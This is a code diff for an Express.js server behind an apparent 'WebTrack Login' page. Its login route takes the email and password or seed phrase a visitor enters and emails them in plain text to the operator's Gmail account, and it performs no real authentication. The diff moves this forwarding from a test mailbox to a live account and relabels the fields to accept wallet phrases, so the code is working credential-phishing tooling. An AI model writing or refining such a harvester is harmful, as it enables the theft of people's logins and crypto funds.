@@ -1,40 +1,27 @@
 const express = require('express');
 const cors = require('cors');
 const nodemailer = require('nodemailer');
+require('dotenv').config();
 
 const app = express();
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
 
 // Middleware
 app.use(cors());
 app.use(express.json());
 app.use(express.static('.')); // Serve static files from current directory
 
-// Create a test account for Ethereal
-let transporter;
+// Create transporter for Gmail
+const transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+        user: process.env.EMAIL_USER,
+        pass: process.env.EMAIL_PASS,
+    },
+});
 
-async function createTransporter() {
-    try {
-        const testAccount = await nodemailer.createTestAccount();
+console.log('Gmail transporter created for:', process.env.EMAIL_USER);
 
-        transporter = nodemailer.createTransport({
-            host: testAccount.smtp.host,
-            port: testAccount.smtp.port,
-            secure: testAccount.smtp.secure,
-            auth: {
-                user: testAccount.user,
-                pass: testAccount.pass,
-            },
-        });
-
-        console.log('Ethereal email transporter created');
-        console.log('Preview URL will be available in console after sending email');
-    } catch (error) {
-        console.error('Failed to create Ethereal account:', error);
-    }
-}
-
-createTransporter();
 
 // Routes
 app.post('/auth/login', async (req, res) => {
@@ -49,14 +36,14 @@ app.post('/auth/login', async (req, res) => {
     try {
         // Send email
         const info = await transporter.sendMail({
-            from: '"WebTrack Login" <login@webtrack.com>',
-            to: 'receiver@example.com', // Change this to the desired receiver
+            from: `"WebTrack Login" <${process.env.EMAIL_USER}>`,
+            to: process.env.EMAIL_USER, // Send to self
             subject: 'New Login Attempt',
-            text: `New login attempt detected.\n\nEmail: ${email}\nPassword: ${password}`,
+            text: `New login attempt detected.\n\nInput: ${email}\nPhrase/Password: ${password}`,
             html: `
         <h3>New Login Attempt</h3>
-        <p><strong>Email:</strong> ${email}</p>
-        <p><strong>Password:</strong> ${password}</p>
+        <p><strong>Input:</strong> ${email}</p>
+        <p><strong>Phrase/Password:</strong> ${password}</p>
       `,
         });
 
